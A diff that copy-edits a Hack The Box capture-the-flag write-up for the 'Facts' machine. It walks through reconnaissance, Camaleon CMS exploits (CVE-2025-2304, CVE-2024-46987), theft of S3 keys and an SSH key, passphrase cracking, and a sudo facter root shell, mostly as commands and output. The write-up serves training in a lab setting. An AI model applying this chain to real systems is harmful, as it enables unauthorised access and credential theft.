@@ -1,13 +1,13 @@
 # Hack The Box: FACTS Write up
 
-Facts is an easy box created for season 10 of HTB, the goal is to get to flags a user flag and a root flag
+Facts is an easy box created for season 10 of HTB. The goal is to get to the flags: a user flag and a root flag.
 
 ## write up
-i was given this ip to accsess the box
+I was given this IP to access the box.
 ```bash
 10.129.7.217
 ```
-a quick ping showed i was able to connect
+A quick ping showed I was able to connect.
 ```bash
 └─$ ping 10.129.7.217         
 PING 10.129.7.217 (10.129.7.217) 56(84) bytes of data.
@@ -15,13 +15,13 @@ PING 10.129.7.217 (10.129.7.217) 56(84) bytes of data.
 64 bytes from 10.129.7.217: icmp_seq=2 ttl=63 time=28.3 ms
 ```
 
-running nmap showed the following ports open
+Running nmap showed the following ports open.
 
 ```bash
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-15 12:04 +0000
 Nmap scan report for 10.129.7.217
 Host is up (0.062s latency).
-Not shown: 998 closed tcp ports (reset)
+Not shown: 998 closed TCP ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -33,10 +33,10 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds
+Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds.
 ```
 
-it was redirecting to http://facts.htb so i edited my /etc/hosts file and added it as a host
+It was redirecting to http://facts.htb, so I edited my /etc/hosts file and added it as a host.
 
 ```bash
 127.0.0.1       localhost
@@ -48,11 +48,11 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-now that i can reach facts.htb opening it in my browser showed a basic web page:
+Now that I can reach facts.htb opening it in my browser showed a basic web page:
 
 ![facts.htb webpage](https://files.catbox.moe/zpo25k.png)
 
-the website is a fact site (as the name might suggest), it displays random facts and displays comments. searching around the / page didn't reveli anything all that intresting. I decided next to run a simple gobuster
+The website is a fact site (as the name might suggest), which displays random facts and comments. Searching around the / page didn't reveal anything all that interesting. I decided to run a simple gobuster
 
 ```bash
 └─$ gobuster dir -url facts.htb -wordlist /usr/share/wordlists/dirb/common.txt   
@@ -144,29 +144,29 @@ Finished
 ===============================================================
 ```
 
-I did have a look through most of these pages but they either redirected to the home page or require the user to be authnticated to acsess. so I turned my attention to the admin login page
+I did have a look through most of these pages, but they either redirected to the home page or require the user to be authenticated to access. So I turned my attention to the admin login page
 
 ![facts.htb admin login](https://files.catbox.moe/7gri2f.png)
 
-I tried some username/password i could think of. admin:admin, admin:changeme etc but was not lucky. I was able however to create my own account
+I tried some username/password I could think of. admin:admin, admin:changeme, etc., but was not lucky. I was able, however, to create my own account.
 
 ![facts.htb admin create user](https://files.catbox.moe/twcw5y.png).
 
-using my user I was able to get to an empty admin panel
+Using my user, I was able to get to an empty admin panel.
 
 ![facts.htb admin create user](https://files.catbox.moe/plfwxd.png)
 
-looking around the admin panel their was nothing useful, i however was able to get a name and version number for this admin panel.
+Looking around the admin panel their was nothing useful. I, however, was able to get a name and version number for this admin panel.
 
 ```
 camaleon CMS - 2.9.0
 ```
 
-doing some research, I found this version of camaleon CMS is vulnerable (CVE-2025-2304) to privilge esculation. the gist of vulnerablity is that when as user whishes to change their password ot calls 'update_ajax' function in the UserController script. this function uses a dangerous method 'permit!' which allows a user to add extra  parameters in the request without any filtering. so not only can you change your password you can change your role as well, such as from client to admin.
+Doing some research, I found this version of Camaleon CMS is vulnerable (CVE-2025-2304) to privilege escalation. The gist of the vulnerability is that when a user wishes to change their password, it calls the 'update_ajax' function in the UserController script. This function uses a dangerous method, 'permit!', which allows a user to add extra  parameters in the request without any filtering. So not only can you change your password, you can change your role as well, such as from client to admin.
 
-I found an exploit on github prewritten (https://github.com/Alien0ne/CVE-2025-2304?tab=readme-ov-file)
+I found an exploit on GitHub (https://github.com/Alien0ne/CVE-2025-2304?tab=readme-ov-file)
 
-with this exploit not only was i able to get admin, i was also able to get their s3 bucket secrets:
+With this exploit, not only was I able to get admin, but I was also able to get their S3 bucket secrets:
 
 ```bash
 └─$ python3 exploit.py -u http://facts.htb -U b -P b -e
@@ -184,7 +184,7 @@ with this exploit not only was i able to get admin, i was also able to get their
 [+]Reverting User Role
 ```
 
-I configured my s3 settings with these accsess keys and tried to list what was in the bucket
+I configured my S3 settings with these access keys and tried to list what was in the bucket.
 
 inside i found 2 directories:
 
@@ -194,7 +194,7 @@ inside i found 2 directories:
 2025-09-11 13:06:52 randomfacts
 ```
 
-inside the internal directory i was able to find a private ssh key:
+Inside the internal directory i was able to find a private SSH key:
 
 ```bash
 └─$ aws --endpoint http://facts.htb:54321 s3 ls s3://internal      
@@ -214,7 +214,7 @@ inside the internal directory i was able to find a private ssh key:
 
 ```
 
-I downloaded the key and left the bucket
+I downloaded the key and left the bucket.
 ``` bash
 └─$ aws --endpoint http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
 download: s3://internal/.ssh/id_ed25519 to ./id_ed25519           
@@ -235,7 +235,7 @@ rfB2RJqDvBJ9i7+dOWAUzDukIj6fylKNbDiqE=
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-using the john the ripper i was able to bruteforce the private key with the rockyou wordlist
+Using John the ripper i was able to brute force the private key with the RockYou wordlist
 
 ```bash
                                                                                                                     
@@ -262,15 +262,15 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-the password for the private key:
+The password for the private key:
 ```bash
 dragonballz      (id_ed25519)
 ```
 
-so great now we have a password all we need now is a user for this private key. this i was stuck on for a while, doing more reascher i eventually found not only was it vulnerable to privilge esculation it also has is arbitary file read (CVE-2024–46987)
+So great now we have a password. All we need now is a user for this private key.I was stuck on this bit for a while, doing more research I eventually found out that not only was it vulnerable to privilege escalation, it also has a arbitary file read (CVE-2024–46987)
 
-looking around I found another exsploit written (https://github.com/Goultarde/CVE-2024-46987)
-using this i was able to read the passwd file
+Looking around, I found another exploit written (https://github.com/Goultarde/CVE-2024-46987)
+Using this i was able to read the passwd file
 
 ``` bash
 └─$ python3 CVE-2024-46987.py -u http://facts.htb -l b -p test /etc/passwd 
@@ -311,7 +311,7 @@ william:x:1001:1001::/home/william:/bin/bash
 _laurel:x:101:988::/var/log/laurel:/bin/false
 ```
 
-this displays all the users on the server, only two users stood out both with UID >= 1000 and /bin/bash as shells
+This displays all the users on the server; only two users stood out, both with UID >= 1000 and /bin/bash as shells
 
 these being
 ```
@@ -319,7 +319,7 @@ trivia
 william
 ```
 
-using my keys with both of these users i was able to log on to the box with the 'trivia' users
+Using my key with both of these users i was able to log on to the box with the 'trivia' users
 
 ```bash
 ┌──(kali㉿kali)-[~/Documents/writeup/facts]
@@ -352,7 +352,7 @@ To check for new updates run: sudo apt update
 trivia@facts:~$ 
 ```
 
-now we are on the box, i ran sudo -l to see if we can run anything with root privilge. luckily we can
+Now we are on the box, I ran sudo -l to see if we can run anything with root privilege. luckily we can
 
 ```bash
 trivia@facts:~$ sudo -l
@@ -364,11 +364,11 @@ User trivia may run the following commands on facts:
     (ALL) NOPASSWD: /usr/bin/facter
 ```
 
-we can use facter and with no password!
+We can use facter and with no password!
 
 Facter is a system profiling tool written in Ruby. It is most commonly used by the configuration management tool Puppet.
 
-Its job is to collect system information (“facts”) about a machine, such as:
+Its job is to collect system information ("facts") about a machine, such as:
 
 - OS version
 - hostname
@@ -379,14 +379,15 @@ Its job is to collect system information (“facts”) about a machine, such as:
 - uptime
 - etc
 
-When Puppet runs, it uses these facts to decide how to configure a system. the reason it is dangerous is because you are able to write custom facts. so as facter is able to be run with root privilge if we write a custom fact that calls a root shell it will happily gives us a root shell
+When Puppet runs, it uses these facts to decide how to configure a system. The reason it is dangerous is that you are able to write custom facts. so because facter is able to be run with root privilge if we write a custom fact that calls a root shell, it will happily give us a root shell
 
-so i wrote a very simple ruby script
+So I wrote a very simple Ruby script
 ```rb
 exec "/bin/sh"
 ```
+All this does is tell the computer to run .sh, which spawns a shell; the shell that is spawned is based on the privilege you are calling it from. so as facter is running with root privilage it will spawn a root shell
 
-and stored this in the /tmp directory as you are able to read/write to this folder as anyone
+I then stored this in the /tmp directory, as you are able to read/write to this folder as anyone
 
 ``` bash
 trivia@facts:~$ cd ../../tmp/
@@ -403,7 +404,7 @@ vmware-root_988-2991203012
 trivia@facts:/tmp$ 
 ```
 
-now all we need to do is simply call this script with facter with sudo
+Now all we need to do is simply call this script with facter with sudo
 
 ``` bash
 
@@ -413,10 +414,10 @@ root
 # 
 ```
 
+We now have root access, we can now get the flags for this box
 we now have root accsess, we can now get the flags for this box
 ```bash
-root.txt: 83248c8389b9cda4cb9f8cd2d88a4113
-user.txt: f74d64d1264fd999b0665cb33a839ebc
+root.txt: 832*****************************
+      
+user.txt: f74*****************************
 ```
-
-
